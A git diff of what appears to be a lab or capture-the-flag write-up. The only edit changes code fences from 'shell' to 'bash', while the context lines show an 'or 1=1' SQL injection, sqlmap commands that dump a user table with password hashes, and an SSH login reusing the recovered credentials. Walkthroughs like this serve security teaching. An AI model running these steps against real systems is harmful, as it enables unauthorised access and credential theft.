@@ -60,7 +60,7 @@ http://hostname/index.html?page=blog&title=Blog&id=2 or 1=1
 
 Let's spin up `sqlmap` to verify that:
 
-```shell
+```bash
 $ sqlmap --url=http://hostname/index.html\?page\=blog\&title\=Blog\&id\=2
 ...
 [14:29:44] [INFO] GET parameter 'id' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
@@ -89,7 +89,7 @@ This confirms the vulnerability of the `id` parameter and also that we have the 
 
 Let's explore the database now, starting with the tables and columns in the database `ehks` (the one we found earlier):
 
-```shell
+```bash
 $ sqlmap --url=http://hostname/index.html\?page\=blog\&title\=Blog\&id\=2 --dbms=MySQL -p id --columns -D ehks
 ...
 Database: ehks
@@ -133,7 +133,7 @@ Table: user
 
 Sweet! now let's dump the user info and try to crack the passwords:
 
-```shell
+```bash
 $ sqlmap --url=http://hostname/index.html\?page\=blog\&title\=Blog\&id\=2 --dbms=MySQL -p id -D ehks -T user --dump
 ...
 [14:48:02] [INFO] recognized possible password hashes in column 'user_pass'
@@ -200,7 +200,7 @@ will lead to the script being executed.
 
 `dstevens` is most likely the admin of the machine, let's try to connect to the box, using SSH, with the same login found on the db:
 
-```shell
+```bash
 $ ssh dstevens@hostname
 dstevens@hostname's password:
 Last login: Mon Mar  9 07:48:18 2009 from 192.168.0.50
